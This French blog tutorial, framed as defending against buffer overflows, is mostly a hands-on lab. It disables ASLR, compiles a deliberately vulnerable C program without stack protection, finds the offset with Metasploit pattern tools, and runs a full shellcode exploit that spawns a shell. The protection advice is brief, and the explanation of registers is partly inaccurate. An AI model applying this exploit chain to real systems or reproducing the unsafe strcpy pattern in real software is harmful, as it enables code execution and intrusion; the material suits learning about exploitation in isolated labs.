# Se protéger des failles buffer overflow

- Canonical URL: https://leandeep.com/se-prot%C3%A9ger-des-failles-buffer-overflow/
- Author: Olivier Eeckhoutte
- Published: 2022-02-25T10:59:00Z
- Updated: 2022-02-25T10:59:00Z
- Language: fr
- Tags: Buffer Overflow, Security
- License: CC BY-NC 4.0 (https://creativecommons.org/licenses/by-nc/4.0/)


L'idée du débordement de tampon (buffer overflow en anglais) est d'écrire des instructions supplémentaires dans les registres dans le but de pouvoir injecter et exécuter du code malveillant.

L'idée de cette attaque est d'injecter du code malveillant grâce au buffer flow, de récupérer les adresses EIP de ces instructions et d'insérer ces adresses EIP dans une stack frame entre les registres EBP et ESP pour qu'elles soient exécutées.

Pour les processeurs 32 bits:

* EIP: registre qui contient l'adresse mémoire des prochaines instructions qui seront exécutées.
* Les registres EBP (début) et ESP (fin) délimitent des stack frames. Lorsque une stack frame est pleine, elle est envoyée dans l'EIP pour être exécutée.

<br/>
Démarrer un container poubelle sur un Host 32 bits. `--privileged` est indispensable pour modifier l'ASLR et installer ensuite les outils nécessaires.
```
docker run -it --rm --privileged --pid=host ubuntu bash
apt update && apt install -y vim gcc gcc-multilib build-essential gdb git python-dev-is-python2 curl ruby-full

# Installation de peda pour trouver l'offset (nombre de caractères à insérer avant d'être en buffer overflow)
git clone https://github.com/longld/peda.git ~/peda && echo "source ~/peda/peda.py" >> ~/.gdbinit

# Installation de metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
mkdir Dev && cd $_ && git clone https://github.com/rapid7/metasploit-framework --depth 1
```

<br/>
Désactiver l'ASLR. &#x26A0; pensez à le réactiver car c'est le host qui est modifié ici, pas le container. (Faites le test avec un nouveau container flambant neuf)
```
cat /proc/sys/kernel/randomize_va_space
echo 0 > /proc/sys/kernel/randomize_va_space
cat /proc/sys/kernel/randomize_va_space
```

<br/>
Créer un fichier C avec une faille buffer overflow: `mkdir Dev && $_ && vim hello.c`
```
#include <string.h>
#include <stdio.h>

void sayHello(char *arg) {
  char buffer[20];
  strcpy(buffer, arg);
  printf("hello %s\n", buffer);
}

int main(int argc, char** argv) {
  sayHello(argv[1]);
  return 0;
}
```

<br/>
On compile:
```
gcc -z execstack -fno-stack-protector -m32 hello.c -o hello
```

<br/>

On exécute le binaire: `./hello World`.
```
hello World
```

On exécute le binaire: `./hello Olivierrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr` avec un débordement du buffer
```
hello Olivierrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr
Segmentation fault
```

<br/>

Trouver l'offset:
```
# Ouvrir un terminal et exécuter:
# Générer une string aléaire à utiliser comme paramètre du programme hello
cd Dev/metasploit-framework/tools/exploit
gem install rex-text
./pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

# Dans un second terminal
gdb ./hello
gdb-peda$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

```


![image](/images/buffer-overflow-offset-gdb.png)


Puis dans le premier terminal exécuter:
```
./pattern_offset.rb -q 0Ab1
```
**[*] Exact match at offset 32**


<br/>
EIP contient l'adresse des instructions à exécuter. Donc on récupère l'ESP (la fin) de la stack frame précédente
```
run $(python -c "print 'A'*32")
info frame
print $esp
```
**--> 0xffffd700**


On se cale dessus et on exécute notre shell code.
On transforme '0xffffd700' -> '\x00\xd7\xff\xff'

Pour le Shell code, rendez-vous sur  http://shell-storm.org/shellcode/files/shellcode-827.php

```
./hello $(python -c "print 'A'*32  + '\x00\xd7\xff\xff' + '\x90'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
```
Et voilà, vous verrez apparaître un shell...


<br/>

## Protection

* Activer l'ASLR (Address Space Layout Randomization)

```
cat /proc/sys/kernel/randomize_va_space 
# Si 2 --> c'est activé; all good
```

<br/>

* Ecrire du code plus robuste
